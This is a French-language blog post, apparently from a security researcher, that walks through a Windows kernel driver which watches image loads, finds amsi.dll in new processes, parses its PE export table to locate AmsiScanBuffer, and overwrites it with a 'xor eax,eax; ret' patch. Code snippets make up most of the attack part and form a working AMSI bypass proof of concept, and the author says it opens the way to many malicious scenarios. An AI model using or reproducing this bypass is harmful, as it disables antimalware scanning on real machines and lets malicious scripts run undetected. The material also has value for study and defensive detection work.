# Driver et injection de code

Un driver est un exécutable qui évolue dans le range d'adresse du monde noyau. Il a la possibilité de faire ce qu'il veut (quasiment) sur la machine et peut donc agir sur le contenu situé dans les adresses virtuelles du monde utilisateur. Ci-dessous un schéma issu de la msdn qui présente les communications entre le monde noyau et le monde utilisateur.

![image alt text](/images/driver/kernelland_userland.png)

Tous les drivers partagent le même espace d'adressage virtuel et peuvent communiquer avec le monde utilisateur et modifier les valeurs situées à des RVA utilisateur.

Le driver présenté ici aura pour objectif de surveiller les créations de process. Lorsque l'un d'eux sera protégé par l'__amsi__, le driver mettra en place un patch (une écriture dans l'espace d'adressage virtuel utilisateur) afin de bypasser l'__amsi__.

On a déjà vu un bypass de l'__amsi__ ici: https://shellchocolat.github.io/2020/05/17/bypass-AMSI.html

Ce bypass est fonctionnel mais il est local, ce qui signifie qu'il n'est actif que pour le process en cours. Il faut le mettre en place à chaque création de nouveaux process ce qui n'est pas le plus commode. Le driver présenté se chargera de patcher les process dès leurs création. Ce n'est pas le plus fun que peut faire un driver, mais c'est une bonne preuve de concept quant à leur puissance et permet d'envisager de nombreux scenarii malveillants.

Un driver fonctionne de manière radicalement différente d'un process utilisateur classique dans le sens où celui-ci doit pouvoir repondre aux demandes de tous les process et drivers en cours d'exécution. Un driver doit donc enregistrer des fonctions de callbacks qui seront ensuite exécutées en fonction de divers évènements. Dans le cas présent un évenement sera la création de process qui déclenchera une fonction de callback qui sera alors de patcher la dll __amsi.dll__ chargée en mémoire.

Dans la msdn on ne parle pas de fonction pour le monde noyau, mais de routine. La routine PsSetLoadImageNotifyRoutine() permet de notifier le driver lorsqu'une image (exe, dll) est chargée en memoire. C'est la routine parfaite pour surveiller le chargement de __amsi.dll__ en mémoire. Elle fait notemment partie des routines utilisées par la plupart des EDR/AV pour surveiller les créations de process. Le code ci-dessous permet d'enregistrer la fonction de callback __notifyRoutine()__.

```C
NTSTATUS status = PsSetLoadImageNotifyRoutine(notifyRoutine);
	if (!NT_SUCCESS(status)) {
		KdPrint(("Failed PsSetLoadImageNotifyRoutine (0x%08X)\n", status));
		return status;
	}
```

La fonction __notifyRoutine()__ a le prototype suivant:

```C
void notifyRoutine(_In_ PUNICODE_STRING FullImageName, _In_ HANDLE ProcessId, _In_ PIMAGE_INFO ImageInfo)
```

Ce qui signifie qu'a chaque chargement d'image, le driver récupère le __nom de l'image__, le __PID__ et des infos contenues dans la structure __IMAGE\_INFO__. Ce qui nous intéresse, c'est essentiellement le nom de l'image. Si celui-ci équivaut à __amsi.dll__, on aura du travailler à effectuer sinon rien du tout. Il faut savoir que dans le monde noyau, la plupart des strings sont des __wchar_t__ et donc un char est codé sur 2 bytes. 

La structure __IMAGE\_INFO__ contient notamment un pointeur vers l'adresse de base de l'image, ce qui permettra d'y accèder par la suite.

Le code permettant de vérifier si l'image qui est en cours de chargement est l'__amsi.dll__, on utilise le code suivant:

```C
if (wcsstr(FullImageName->Buffer, L"amsi.dll") != NULL) {
	KdPrint(("AMSI VA ImageBase: 0x%X\n", ImageInfo->ImageBase));

	PVOID pImageBase = ImageInfo->ImageBase;
	if (NT_SUCCESS(ScanModuleFunctions(ProcessId, pImageBase))) {
		KdPrint(("Module scanned\n"));
	}
}
```

Si l'image chargée en mémoire est bien l'__amsi.dll__ alors le driver exécutera la fonction __ScanModuleFunctions()__. Cette fonction est le coeur du driver et prend en paramètre le __PID__ ainsi que l'adresse du module en mémoire. Elle permet de scanner les fonctions du module en question.

Maintenant que l'on est capable de discriminer les images chargées en memoire en fonction de leurs noms (en l'occurence __amsi.dll__), il faut pouvoir en lister les fonctions. En l'occurence, ici il faut pouvoir trouver l'adresse de __AmsiScanBuffer()__ afin de la patcher pour éviter le scan du code malveillant par l'__amsi__.

Il n'existe pas de routine pour trouver les fonctions dans une dll chargée par un process utilisateur. En userland on a le classique __LoadLibrary() / GetProcAddress()__ qui permet de trouver les addresses des fonctions. Dans le monde noyau, il faut agir différemment. Il est nécessaire de connaitre la structure d'un PE pour cela. Ci-dessous est présenté la structure d'une PE.

![image alt text](/images/driver/pe_struct.png)-p

Les premiers bytes sont __5A4D__ équivalent à __MZ__ (situé dansl __e\_magic__) signifiant qu'il s'agit bien d'un PE. Ces bytes sont situées dans la structure __\_IMAGE\_DOS\_HEADER__ qui est présentée ci-dessous:

![image alt text](/images/driver/image_dos_header.png)

L'élement __e\_lfanew__ permet de donner l'adresse de la structure suivante: __\_IMAGE\_NT\_HEADERS64__ présentée ci-dessous:

![image alt text](/images/driver/image_nt_header.png)

Lorsque l'on regarde ce qui se situe dans l'__OptionalHeader__, on y voit la structure __\_IMAGE\_OPTIONAL\_HEADER64__ présentée ci-dessous:

![image alt text](/images/driver/image_optional_header.png)

Contrairement à ce que son nom peu indiquer, elles et très importante car elle permet d'avoir accès au __DataDirectory__ (dernier élement de cette structure). __DataDirectory__ est une liste de __16__ de structures (contenant 2 éléments: __relative virtual address__ et __size__). Si l'on regarde le premier élément de cette liste: 

![image alt text](/images/driver/data_directory.png)

on voit qu'il s'agit de l'__Export Directory__. On a donc enfin trouvé l'adresse de l'__Export Directory__ qui est une structure. Cette structure est présentée ci-dessous:

![image alt text](/images/driver/export_directory.png)

Il est donc possible de connaitre le nombre de fonctions exportées en consultant l'élement __NumberOfFunctions__, puis de connaitre les adresses des fonctions en consultant l'élément __AddressOfFunctions__. On discriminera les fonctions grâce à leurs noms contenus dans l'élément __AddressOfNames__.

Il faut donc faire une boucle sur __0x0D__ (nombre de fonctions exportées) et vérifier les noms de fonctions. Une fois __AmsiScanBuffer()__ trouvée, il faut la patcher. Le code qui permet de boucler sur les fonctions et de patcher et présenté ci-dessous:

```C
for (UINT64 i = 0; i < ExportDirectory.NumberOfNames; i++) {
	function_name = { 0 };

	result = KeReadProcessMemory(&addressOfNamesValue, (PVOID)(addressOfNames + i * 4), sizeof(addressOfNamesValue));

	result = KeReadProcessMemory(&function_name, (PVOID)((UINT64)pImageBase + (UINT64)addressOfNamesValue), sizeof(function_name));

	if (strstr(function_name.Value, "AmsiScanBuffer") != NULL) {
		result = KeReadProcessMemory(&addressOfFunctionsValue, (PVOID)(addressOfFunctions + i * 4), sizeof(addressOfFunctionsValue));

		function_address = (UINT64)pImageBase + (UINT64)addressOfFunctionsValue;

		KAPC_STATE KAPC = { 0 };
		KeStackAttachProcess(pProcess, &KAPC);

		UINT8 patch[] = { 0x31, 0xC0, 0xC3 };
		KeWriteProcessMemory((PVOID)function_address, (PVOID)&patch, sizeof(patch));

		KeUnstackDetachProcess(&KAPC);

		break;
	}
}
```

Le driver en fonctionnement est présente ci-dessous:

![image alt text](/images/driver/poc_1.png)

La première erreur montre que l'__amsi__ est actif car il bloque l'exécution de la chaine de charactères __amsiScanBuffer__. Puis on active le driver sur le __cmd__ à droite, puis on exécute de nouveau le script et on obtient la même erreur ! Cela est dû au fait que le driver surveille les créations de process et non les process déjà crée ! Il faut exécuter un nouveau process pour que celui-ci soit patché comme on peut le voir ci-dessous:

![image alt text](/images/driver/poc_2.png)

Une fois le driver actif, tous les process utilisant l'__amsi__ seront alors patchés.

